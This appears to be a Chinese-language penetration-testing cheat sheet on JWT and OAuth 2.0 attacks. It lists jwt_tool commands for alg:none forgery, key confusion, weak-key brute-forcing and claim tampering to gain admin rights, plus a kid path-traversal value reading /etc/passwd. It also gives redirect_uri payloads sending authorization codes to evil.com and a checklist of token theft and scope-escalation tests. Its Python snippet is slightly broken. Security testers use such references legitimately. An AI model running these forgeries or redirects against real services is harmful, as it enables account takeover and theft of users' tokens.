# JWT + OAuth 2.0 安全测试

## JWT 攻击面

### 1. 算法混淆

```bash
# alg:none — 最经典
# 原始: {"alg":"RS256","typ":"JWT"}.payload.signature
# 攻击: {"alg":"none","typ":"JWT"}.payload.  (空签名)

# RS256 → HS256 密钥混淆
# 如果服务端用 RS256 公钥做 HS256 验证
# 可以把公钥当 HMAC 密钥来签名
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid 注入
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# 服务端用 kid 指向的文件内容做 HMAC 密钥
```

### 2. jwt_tool 完整用法

```bash
# 全面扫描
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# 弱密钥爆破
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# 声明篡改
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA 密钥混淆
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 嵌入 JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. 手工 JWT 篡改

```python
import jwt
import base64

# 解码（不验证）
header, payload, sig = jwt.split('.')

# 篡改 payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 攻击面

### Authorization Code Grant

```text
1. redirect_uri 操控
   正常: https://app.com/callback?code=AUTH_CODE
   攻击: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         开放重定向 + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via state 缺失
   无 state 参数 → 攻击者用自己的 code 绑定受害者 session

3. PKCE 缺失
   无 code_challenge → 授权码拦截攻击

4. Token 在 Referer 泄漏
   回调页面加载外部资源 → Referer 头包含 code/token
```

### Implicit Grant（已废弃但仍有部署）

```text
1. access_token 在 URL fragment → Referer 泄漏
2. token 在浏览器历史 → 物理访问风险
3. 无客户端认证 → token 替换攻击
```

### Client Credentials Grant

```text
1. client_secret 泄漏（前端/移动端硬编码）
2. 过度 scope 授予
3. 无 client 限速 → 暴力枚举
```

### 通用 OAuth 测试

```text
□ 测试 scope 提升: scope=read → scope=read%20write
□ Token 重放: 用旧的 access_token 访问新资源
□ Refresh token 滥用: refresh_token 无限续期
□ 跨租户访问: tenant A 的 token 访问 tenant B
□ Token 在日志/URL/Referer 中泄漏
```

## 工具

```bash
# JWT 测试
pip install jwt-tool pyjwt

# OAuth 测试
# Burp Suite + OAuth Scanner 扩展
# Postman OAuth 2.0 流程测试

# 自动化
# Entropy: 自动 JWT 篡改 + OAuth redirect_uri 测试
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
